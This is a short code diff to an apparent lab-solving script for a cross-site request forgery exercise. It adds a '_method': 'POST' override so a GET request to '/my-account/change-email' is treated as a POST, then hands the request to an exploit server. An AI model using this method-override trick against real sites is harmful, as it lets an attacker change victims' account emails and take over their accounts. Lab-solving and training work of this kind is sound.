@@ -9,7 +9,7 @@ def solve_lab(session):
     req = Request(
         "GET",
         urljoin(session.url, "/my-account/change-email"),
-        params={"email": "user@example.com"},
+        params={"email": "user@example.com", "_method": "POST"},
     )
 
     exploit_server = session.exploit_server()
